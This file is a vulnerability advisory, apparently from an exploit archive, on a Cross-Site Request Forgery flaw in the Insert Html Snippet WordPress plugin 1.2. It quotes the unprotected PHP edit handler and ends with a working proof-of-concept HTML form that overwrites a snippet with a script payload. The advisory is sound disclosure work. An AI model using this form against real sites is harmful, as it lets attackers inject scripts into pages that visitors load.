@@ -1,0 +1,83 @@
+id: 26439
+date: 11/29/2016
+title: WordPress Insert Html Snippet 1.2 Cross Site Request Forgery Vulnerability
+author: Yorick Koster
+cves: 
+
+------------------------------------------------------------------------
+Cross-Site Request Forgery in Insert Html Snippet WordPress Plugin
+------------------------------------------------------------------------
+Yorick Koster, July 2016
+
+------------------------------------------------------------------------
+Abstract
+------------------------------------------------------------------------
+It was discovered that the Insert Html Snippet WordPress Plugin is
+vulnerable to Cross-Site Request Forgery. Amongst others, this issue can
+be used to update an existing HTML snippet. This can be used to insert
+arbitrary HTML and scripting code within a post or page that uses the
+snippet. In order to exploit this issue, the attacker has to lure/force
+a logged on WordPress Administrator into opening a malicious website.
+
+------------------------------------------------------------------------
+Tested versions
+------------------------------------------------------------------------
+This issue was successfully tested on Insert Html Snippet WordPress
+Plugin version 1.2.
+
+------------------------------------------------------------------------
+Fix
+------------------------------------------------------------------------
+This issue has been addressed in Insert Html Snippet version 1.2.1.
+
+------------------------------------------------------------------------
+Details
+------------------------------------------------------------------------
+https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_insert_html_snippet_wordpress_plugin.html
+
+This issue exists because Insert Html Snippet lacks protection against Cross-Site Request Forgery attacks. See for example the code that is used to edit a snippet.
+
+if(isset($_POST) && isset($_POST['updateSubmit'])){
+   
+//       echo '<pre>';
+//       print_r($_POST);
+//       die("JJJ");
+   $_POST = stripslashes_deep($_POST);
+   $_POST = xyz_trim_deep($_POST);
+   
+   $xyz_ihs_snippetId = $_GET['snippetId'];
+   
+   $temp_xyz_ihs_title = str_replace(' ', '', $_POST['snippetTitle']);
+   $temp_xyz_ihs_title = str_replace('-', '', $temp_xyz_ihs_title);
+   
+   $xyz_ihs_title = str_replace(' ', '-', $_POST['snippetTitle']);
+   $xyz_ihs_content = $_POST['snippetContent'];
+   
+   if($xyz_ihs_title != "" && $xyz_ihs_content != ""){
+   
+      if(ctype_alnum($temp_xyz_ihs_title))
+      {
+      $snippet_count = $wpdb->query($wpdb->prepare( 'SELECT * FROM '.$wpdb->prefix.'xyz_ihs_short_code WHERE id!=%d AND title=%s LIMIT 0,1',$xyz_ihs_snippetId,$xyz_ihs_title)) ;
+   
+      if($snippet_count == 0){
+         $xyz_shortCode = '[xyz-ihs snippet="'.$xyz_ihs_title.'"]';
+   
+         $wpdb->update($wpdb->prefix.'xyz_ihs_short_code', array('title'=>$xyz_ihs_title,'content'=>$xyz_ihs_content,'short_code'=>$xyz_shortCode,), array('id'=>$xyz_ihs_snippetId));
+
+In order to exploit this issue, the attacker has to lure/force a logged on WordPress Administrator into opening a malicious website.
+
+Proof of concept
+
+<html>
+   <body>
+      <form action="http://<target>/wp-admin/admin.php?page=insert-html-snippet-manage&action=snippet-edit&snippetId=1&pageno=1" method="POST">
+         <input type="hidden" name="snippetId" value="1" />
+         <input type="hidden" name="snippetTitle" value="Fu" />
+         <input type="hidden" name="snippetContent" value="<script>alert(1);</script>" />
+         <input type="hidden" name="updateSubmit" value="Update" />
+         <input type="submit" value="Submit request" />
+      </form>
+   </body>
+</html>
+
+#  0day.today [2023-03-21]  #
